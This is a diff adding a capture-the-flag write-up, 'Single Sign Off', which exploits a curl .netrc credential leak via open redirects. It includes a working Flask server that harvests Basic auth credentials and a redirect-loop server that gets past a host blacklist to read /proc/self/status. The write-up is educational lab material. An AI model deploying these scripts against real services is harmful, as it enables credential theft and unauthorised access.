@@ -85,4 +85,78 @@ print("Note link:", note_link)
 
 print("XSS payload injected, submit url to admin bot")
 ```
+---
+
+## Single Sign Off
+> flag: nite{r3dir3ct_l3ak_r3p3at}
+
+### Solution:
+- If we check the dockerfile, we can see it uses curl `7.80.0`, which is vulnerable to [CVE-2025-0167](https://curl.se/docs/CVE-2025-0167.html)
+- So basically when `.netrc` file contains empty default entries, it allows the credentials to be leaked via a redirect
+- To get access to `nite-vault`, we must find the credentials from `nite-sso` in `.netrc` file
+- `nite-sso` has `doLogin` endpoint which allows for open redirects
+- So we can use a python script to automate this and also send a 401 request to attatch credentials:
+```
+from flask import Flask, request
+import base64
+
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def capture_all(path):
+
+    auth = request.headers.get('Authorization')
+    
+    if auth and auth.startswith('Basic '):
+        try:
+            encoded = auth.split(' ')[1]
+            decoded = base64.b64decode(encoded).decode('utf-8')
+            
+            print(f"credentials: {decoded}")
+            
+            return f"credentials: {decoded}\n", 200
+            
+        except Exception as e:
+            return "Error decoding credentials", 400
+    else:  
+        return "getting creds", 401, {
+            'WWW-Authenticate': 'Basic realm="Credential Capture"'
+        }
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5001, debug=False)
+```
+- We still cannot access `nite-vault` due to blacklist
+- `CURLE_TOO_MANY_REDIRECTS` is vulnerable and doesn't check for final redirect after limit is reached
+- We can create a loop using python script to access this:
+```
+from flask import Flask, redirect, request
+import sys
+
+app = Flask(__name__)
+
+REDIRECT_COUNT = 0
+MAX_REDIRECTS = 6
+TARGET = "http://nite-vault/view?file=/proc/self/status&username=fakeuser&password=fakepassword"  
+
+@app.route('/')
+def redirector():
+    global REDIRECT_COUNT
+    REDIRECT_COUNT += 1
+
+    host = request.host
+    scheme = request.scheme
+    
+    if REDIRECT_COUNT < MAX_REDIRECTS:
+        return redirect(f"{scheme}://{host}/", code=302)
+    else:
+        REDIRECT_COUNT = 0
+        return redirect(TARGET, code=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 5001)
+```
+- `/proc/self/status` contains `pid`, `uid` and `gid`, the file name of flag is generated from PRNG with seed values containing formarlly mentioned values
 
